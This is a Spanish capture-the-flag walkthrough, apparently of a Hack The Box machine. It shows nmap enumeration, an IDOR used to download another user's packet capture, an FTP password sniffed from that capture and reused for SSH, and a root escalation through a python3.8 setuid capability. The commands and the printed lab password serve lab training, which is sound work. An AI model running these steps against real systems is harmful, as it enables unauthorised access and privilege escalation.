### Enumeración:

En primer lugar lanzamos un ping a la máquina para comprobar que se encuentra activa:
$ ping -c1 10.129.153.150
Vemos que enviamos un paquete y nos devuelve un paquete, por lo que esta activa. Además vemos un valor de ttl 63, al ser cercano a 64 nos indica que estamos frente a una máquina Linux. 
A continuación vamos a enumerar puertos abiertos del protocolo TCP:
$ nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.129.153.150
Encontramos lo puertos (21, 22 y 80) abiertos.
Realizamos un escaneo con los scripts más comunes de Nmap y conjuntamente otro escaneo para detectar servicios y versiones que corren en dichos puertos:
$ nmap -sCV -p21,22,80 10.129.153.150
Vamos a fuzear en busca de subdominios dentro del servicio HTTP:
$ nmap --script http-enum -p80 10.129.153.150
### Explotación:

Dentro de la Web vemos que en Security Snapshot podemos acceder a los datos de otros usuarios a través de un IDOR (Insecure Direct Object Reference), si nos dirigimos a data=0 podemos descargar una captura .pcap, realizada por un usuario.
Nos abrimos la captura en WireShark:
$ wireshark -r 0.pcap &>/dev/null & disown
Dentro de wireshark vamos filtrando por puertos, en el puerto 21 vemos una petición de logeo con el usuario nathan y la contraseña Buck3tH4TF0RM3!.
Nos conectamos a través de ftp:
$ ftp nathan@10.129.153.150
Buck3tH4TF0RM3!
Tenemos acceso al protocolo ftp (21):
ftp>dir
ftp>get user.txt
$ cat user.txt
Podemos probar las mismas credenciales para acceder por ssh:
$ ssh nathan@10.129.153.150
Buck3tH4TF0RM3!
Estamos dentro de la máquina como usuario no privilegiado, buscamos formas de escalar privilegios:
Vemos la versión del kernel:
$ uname -a
Vemos los valores uid y gid:
$ id
Vemos privilegios de sudoers:
$ sudo -l
Vemos binarios de los que podamos abusar:
$ find / -perm 4000 -user root 2>/dev/null | xargs ls -l
Vemos las capabilities:
$ getcap -r / 2>/dev/null
Vemos que python3.8 tiene asignada la capability de cambiar el SUID, por lo que esto nos puede permitir escalar privilegios:
$ python3.8
import os
os.setuid(0)
os.system("/bin/bash")
Ya somos usuario privilegiado, por último buscamos la flag de root:
find / -name root.txt | xargs cat